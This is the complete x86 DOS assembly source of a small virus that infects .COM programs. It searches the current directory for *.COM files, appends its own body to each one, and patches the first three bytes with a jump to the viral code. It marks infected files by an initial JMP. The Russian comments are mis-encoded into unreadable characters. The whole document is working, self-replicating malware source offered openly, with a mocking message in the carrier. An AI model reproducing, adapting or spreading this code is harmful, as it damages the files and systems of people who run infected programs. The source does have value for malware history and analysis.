; �����쪨� (��� ����让) �����, ��ࠦ��騩 .COM-�ணࠬ��
;   �� ����᪥, �᫨ � ��� ���� ���砫� JMP.
; �஢�ન �� ��直� ���筮�� �� ����������.
;
; Copyright (c) 1992, Gogi&Givi International.
;

.model	tiny
.code
	org	0100h
start:
	jmp	virusstart			; ���室 �� �����:
	mov	ah,09h				;   ⠪��, ��� �㤥�
	int	21h				;   � ���⢮� ��
	mov	ax,4C00h			;   ��ࠦ����
	int	21h
	Message	db 'This is little infection... He-he...',13,10,'$'
						; �� �� ��� ��ଠ���
						;   ��� �����

virusstart:					; � �� �����
        pushf
	push	ax				; ���࠭塞 ��, ��
	push	bx				;   ⮫쪮 �����...
	push	cx
	push	dx
	push	ds				; �� ����, ��᪮�쪮
	push	es				;   �� �ࠢ��쭮...
	push	si
	call	SelfPoint
SelfPoint:                                      ; ��।��塞 ���
        pop     si                              ;   �室�

        cld                                     ; �������� ��ࠢ�
        push    cs                              ; ���⠢�� ᥣ�����
        pop     ds                              ;   ॣ����� �����祭��
        push    cs                              ;   � ��ࠢ�����
	pop	es
	mov	di,0100h			; � �ਥ����� - 0100h,
	push	si				;   ��砫� �ணࠬ��
	add	si,original-SelfPoint		; ����� SI 㪠�뢠�� ��
	mov	cx,3				;   �ਣ������ �����
	rep	movsb				; ������㥬 �� � ��砫�
	pop	si				;   ��ࠦ����� �ணࠬ��

	mov	ah,1Ah				; ���⠢�� ᮡ�⢥����
	mov	dx,si				;   DTA �� ���� �����
	add	dx,VirusDTA-SelfPoint		;   21h ���뢠����
	int	21h

	mov	ah,4Eh				; ������ FindFirst
	mov	dx,si				;   � ᮮ⢥�����饩
	add	dx,FileMask-SelfPoint		;   ��᪮�
	mov	cx,32				;   � ��ਡ�⮬ �⥭��/
	int	21h				;   ������, �⮡� ��
						;   �����
	jnc	RepeatOpen			; �訡�� ��� - ���뢠��

	jmp	OutVirus			; ����� ��襫...

RepeatOpen:
        mov     ax,3D02h                        ; ��஥� 䠩�
        mov     dx,si                           ;   �� ����� ���७����
        add	dx,NameF-SelfPoint		;   �ࠢ����� ���
	int	21h
	jc	OutVirus			; �� ��� �訡��� ��室��

        mov     bx,ax                           ; ���쬥� ����� 䠩��,
						;   � �㤥� ��ঠ���� �� BX

	mov	ah,3Fh				; ���뢠�� �����騥
	mov	dx,si				;   ������� ���
	add	dx,Original-SelfPoint		;   �ᯮ������
	mov	cx,3				; ����� �㤥� �� ����
	int	21h
        jc      OutVirus			; ����� �஢�ਬ �� �訡��...
	push	bx
	mov	bx,dx
	cmp	byte ptr [bx],'�'		; ���� � �⮬ 䠩��
	pop	bx				;   ⮦� ᭠砫� ���室?
						; 
	je	CloseNotInfect			; ����� �� ��ࠦ���!
						; ��, ���� ��� ���筥�
						;   �஢�����...

	mov	ax,4202h			; ��룠�� � �����
	xor	cx,cx				;   ����� (����ᨫ������)
	xor	dx,dx
	int	21h				; ������ � AX �����
        jc      OutVirus                        ;   ���� ��砫�
						;   �����, �᫨ ���,
						;   ����筮, �訡��
	push	ax

	mov	ah,40h				; ����襬
	mov	dx,si				;   ⥫� �����
	sub	dx,SelfPoint-VirusStart		;   � 䠩�-�����
	mov	cx,VirusEnd-VirusStart		; ������⢮ ����
	int	21h

	pop	ax
        jc      OutVirus			; ����� ������� �訡�� - 
						;   ���, ⠬, ��९�����...

        sub     ax,3                            ; ���⠥� 3 - �⮡�
        push    bx                              ;   ������� �㤠 ����
	mov	bx,si
	sub	bx,SelfPoint-VirusStart
	mov	word ptr cs:[bx+1],ax		; ������ ����
	mov	byte ptr [bx],'�'		; ������� ���室� (�
						;   �।���� ᥣ����)
	pop	bx

	mov	ax,4200h			; � ⥯��� � ��砫�
	xor	cx,cx				;   �����
	xor	dx,dx
	int	21h
        jc      OutVirus			; �஢�ઠ �� �訡��

	mov	ah,40h				; � ����襬 �㤠
	mov	dx,si				;   ������� ���室�
	sub	dx,SelfPoint-VirusStart		;   �� ��� ���᭮�
	mov	cx,3				;   ⥫�
	int	21h
        jc      OutVirus			; ����� �஢�ਬ �訡��

	mov	ah,3Eh				; ���� ���� �������
	int	21h				;   (�� 㦥 ��ࠦ�� -
	jmp	OutVirus			;   ����� �� ࠡ�⠥�)

CloseNotInfect:
	mov	ah,3Eh				; ����뢠�� �����室�騩
	int	21h				;   䠩�
	
	mov	dx,si
	add	dx,FileMask-SelfPoint		; � ������ FindNext
	mov	ah,4Fh
	int	21h
	jc	OutVirus			; �訡�� - �����, �� ��졠
	jmp	RepeatOpen			; ��� ���室 �� ����⨥

OutVirus:
	pop	si				; �, ����筮 ��,
	pop	es				;   �� �� ᢥ�
	pop	ds				;   ����⠭�����
	pop	dx
	pop	cx
	pop	bx
	pop	ax
        popf
	mov	si,0100h			; ����ᨬ � �⥪ ����
	push	si				;   ��砫� �ணࠬ��
	ret					;   � ������ RET

						; ��� �����:

VirusDTA	db 30 dup (0)			; �� DTA
NameF		db 13 dup (0)			; ��� �㤥� ��� 䠩��
FileMask	db '*.cOm',(0)			; ��� ⠪�� ��ᨢ��
						;   ��᪠
original:
	mov	dx,offset Message		; � �� �ਣ������ �����
VirusEnd:					;   �� ����� (�����᪨�,
						;   �� �����!)
	end	start
